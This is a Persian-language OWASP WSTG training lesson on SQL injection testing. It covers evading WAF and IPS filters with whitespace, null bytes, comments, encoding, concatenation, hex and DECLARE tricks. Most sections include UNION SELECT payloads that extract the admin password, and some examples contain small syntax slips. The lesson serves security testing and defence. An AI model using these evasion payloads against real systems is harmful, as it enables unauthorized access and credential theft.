# بررسی SQL Injection

در این بخش از دوره آموزشی OWASP-WSTG به هفتمین بخش از استاندارد WSTG با شناسه WSTG-INPV-05 می پردازیم که مربوط به بررسی SQL Injection می باشد. لازم به ذکر است با توجه به طولانی بودن مبحث تزریق SQL، این بخش از استاندارد OWASP در چندین قسمت قرار داده می شود.

### بررسی Automated Exploitation

بسیاری از شرایط و تکنیک‌های ارائه‌شده در اینجا را می‌توان به صورت خودکار و با استفاده از برخی ابزارها انجام داد. یکی از ابزارهای کاربردی در حوزه بررسی و اکسپلویت آسیب پذیری SQL Injection، ابزار SQLMap می باشد. در مقاله زیر، اطلاعاتی در مورد نحوه انجام یک بررسی خودکار با استفاده از SQLMapبیان شده است.

https://wiki.owasp.org/index.php/Automated_Audit_using_SQLMap


### بررسی SQL Injection Signature Evasion Techniques

این تکنیک‌ها برای دور زدن سیستم‌های دفاعی مانند فایروال‌های نرم‌افزاری وب (WAF)‏ یا سیستم‌های پیش‌گیری از نفوذ (‏IPS) مورد استفاده قرار می‌گیرند که در ادامه به برخی از آن‌ها اشاره شده است. البته شما می‌توانید جهت مطالعه بیشتر به لینک زیر نیز مراجعه نمایید:

https://owasp.org/www-community/attacks/SQL_Injection_Bypassing_WAF

### روش Whitespace

یکی از روش های عبور از سیستم های امنیتی، کاهش فضا یا اضافه کردن فضاهایی است که بر دستورات SQL تاثیر نخواهند گذاشت.
```sql
or 'a'='a'
or 'a'  =  'a'
```
نمونه ای دیگر، اضافه کردن کاراکتر خاص مانند خط جدید یا tab است که اجرای دستورات SQL را تغییر نخواهد داد. برای مثال:


```sql
or
'a'=
        'a'
```


### روش Null Bytes

از Null Bytes (%00)‏ قبل از هر کاراکتری که برنامه (یا سیستم فیلترینگ برنامه) آن را مسدود می‌کند استفاده کنید.

برای مثال، اگر مهاجم قصد تزریق SQL زیر را تزریق داشته باشد:
```sql
' UNION SELECT password FROM Users WHERE username='admin'--
```
اضافه کردن Null Bytes در آن به صورت زیر خواهد بود:
```sql
%00' UNION SELECT password FROM Users WHERE username='admin'--
```
یا حتی به شکل زیر میتوان استفاده کرد:
```sql
' UN%00ION SE%00LE%00CT password FR%00OM U%00ser%00s W%00H%00E%00RE username='admin'%00-%00-
```
مورد بالا درصورتی استفاده میشود که WAF کلمات ورودی را پایش و عبارات دستوری SQL را درصورت مشاهده، حذف میکند.

### روش SQL Comments

اضافه کردن Inline Comment ها درSQL نیز می‌تواند به معتبر ماندن دستورات SQL و دور زدن فیلتر تزریق SQL کمک کند. این تزریق SQL زیر را به عنوان مثال در نظر بگیرید:
```sql
' UNION SELECT password FROM Users WHERE name='admin'--
```

اضافه کردن Inline Comment ها در آن به صورت زیر خواهد بود:
```sql
'/**/UNION/**/SELECT/**/password/**/FROM/**/Users/**/WHERE/**/name/**/LIKE/**/ 'admin'--
' /**/UNI/**/ON/**/SE/**/LECT/**/password/**/FROM/**/Users/**/WHE/**/RE/**/name/**/LIKE /**/ 'admin'--
```

### روش URL Encoding

روش دیگری که از آن می‌توان برای عبور از سیستم‌های امنیتی بهره برد، استفاده از کدگذاری URL برای کدگذاری دستورات SQL است.
```sql
' UNION SELECT password FROM Users WHERE name='admin'--
```
کدگذاری URL برای تزریق SQL به شکل زیر خواهد بود:
```sql
%27%20UNION%20SELECT%20password%20FROM%20Users%20WHERE%20name%3D%27admin%27--
```
### روش Character Encoding

از تابع char() می‌توان برای جایگزین کردن کاراکترها استفاده کرد. به عنوان مثال، char(114,111,111,116) به معنی root است.
```sql
' UNION SELECT password FROM Users WHERE name='root'--
```

پس از اعمال char() تزریق SQL به شکل زیر خواهد بود:
```sql
' UNION SELECT password FROM Users WHERE name=char(114,111,111,116)--
```
### روش String Concatenation

متد Concatenation یا الحاق، کلمات کلیدی SQL را شکسته (به دو یا چند قسمت تقسیم نموده) و می‌تواند منجر به عبور از مکانزیم های امنیتی شود. Syntax الحاق براساس پایگاه‌داده متفاوت خواهد بود. پایگاه‌داده MSSQL را به عنوان مثال در نظر بگیرید.
```sql
SELECT 1
```
عبارت SQL ساده را می توان به صورت زیر با استفاده از الحاق تغییر داد.
```sql
EXEC('SEL' + 'ECT 1')
```
### روش Hex Encoding

تکنیک کدگذاری Hex از کدگذاری Hexadecimal برای جایگزین کردن دستور SQL اصلی استفاده می‌کند. برای مثال عبارت root می‌تواند به صورت 726F6F74 نمایش داده شود.

```sql
Select user from users where name = 'root'
```

عبارت SQL با استفاده از مقدار HEX به صورت زیر خواهد بود:
```sql
Select user from users where name = 726F6F74
```
یا
```sql
Select user from users where name = unhex( '726F6F74')
```

### روش Declare Variables

روش دیگری که می توان از آن استفاده نمود، استفاده از Declare است. با استفاده Declare شما می توانید دستورات تزریق SQL خود را تعریف و اجرا نمایید.
برای مثال، عبارت تزریق SQL زیر را در نظر بگیرید:
```sql
UNION SELECT password
```

عبارت SQL خود را در متغیر SQLivar تعریف کنید:
```sql
; declare @SQLivar nvarchar(80); set @myvar N'UNI' + N'ON' + N' SELECT' + N'password'); EXEC(@SQLivar)
```


### با با متد Alternative Expression


```sql
OR 'SQLi' ='SQL'+'i'
OR 'SQLi' &gt; 'S'
or 20 &gt; 1
OR 2 between 3 and 1
OR 'SQLi' = N'SQLi'
1 and 1 1
1 || 1 = 1
1 && 1 = 1
```
### راهکار Remediation

برای ایمن کردن برنامه از آسیب‌پذیری‌های تزریقSQL، می‌توانید به CheatSheet پیش‌گیری از تزریق SQL مراجعه کنید:

* https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html
* https://cheatsheetseries.owasp.org/cheatsheets/Database_Security_Cheat_Sheet.html
* https://cheatsheetseries.owasp.org/cheatsheets/Input_Validation_Cheat_Sheet.html
